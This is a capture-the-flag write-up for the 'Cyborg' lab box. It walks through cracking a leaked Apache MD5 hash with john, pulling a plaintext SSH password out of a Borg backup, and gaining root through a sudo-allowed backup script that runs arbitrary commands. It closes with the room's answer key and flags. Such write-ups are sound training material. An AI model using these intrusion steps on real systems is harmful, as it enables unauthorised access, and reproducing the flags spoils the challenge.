# Cyborg
Write-Up by **Mttttt** *2025-04-24*

## Room Description
A box involving encrypted archives, source code analysis and more.
## Solution
### nmap
**22**, **80**
### dirsearch
```
/etc/
/admin/
```
---
#### admins.html
There is page `/admin/admin.html`:
There are different names (could be useful in in the future):
```
Josh
Adam
Alex
```
#### passwd (/etc/squid)
In `/etc/squid` there is file `passwd` with credentials: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`
It looks like a *Apache MD5* key
We need to use tool like **john** or **hashcat** to decrypt key
```bash
echo "music_archive:\$apr1\$BpZ.Q.1m\$F0qqPwHSOG50URuOVQTTn." > hash.txt
john --format=md5crypt hash.txt # use --wordlist=/path/to/wrdlst if needed
```
Result: **squidward**
#### archive.tar
Also i downloaded `archive.tar` from `/admin/archive.tar`
There is a README file in it:
```
This is a Borg Backup repository.  
See https://borgbackup.readthedocs.io/
```
We should use `borg` *CLI* utility for "recovering" files
```bash
cd home/field/dev/final_archive
borg extract .::music_archive
```
Then go to the new extracted directory:
```bash
cd ./home/alex/
```
There are two txt files in Alex's home directory:
```
home/alex
├── Desktop  
│   └── secret.txt  
├── Documents  
│   └── note.txt  
├── Downloads  
├── Music  
├── Pictures  
├── Public  
├── Templates  
└── Videos
```
*Desktop/secret.txt*:
```
shoutout to all the people who have gotten to this stage whoop whoop!"
```
*Documents/note.txt:*
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!  
  
alex:S3cretP@s3
```
---
### User flag
```bash
ssh alex@<IP-OF-MACHINE>
ls # there is user.txt file
cat user.txt
```
`flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`
### Root flag
Lets see what Alex could execute without root rights:
```
$ sudo -l
Matching Defaults entries for alex on ubuntu:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User alex may run the following commands on ubuntu:  
   (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
This script supposes to backup all mp3 flles, but we also can execute commands via it:
```
$ sudo /etc/mp3backups/baskup.sh -c "echo hello world!"
<useless output about backups>
hello world!
```
So, lets use command to read root.txt file:
```bash
sudo /etc/mp3backups/baskup.sh -c "cat /root/root.txt"
```
`flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`
## Questions
1. *Question #1*. Scan the machine, how many ports are open?
   *Answer*: **2**
2. *Question #2.* What service is running on port 22?
   *Answer*: **ssh**
3. *Question #3*. What service is running on port 80?
   *Answer*: **http**
4. *Question #4* What is the user.txt flag?
   *Answer*: **flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}**
5. *Question #5.* What is the root.txt flag?
   *Answer*: **flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}**
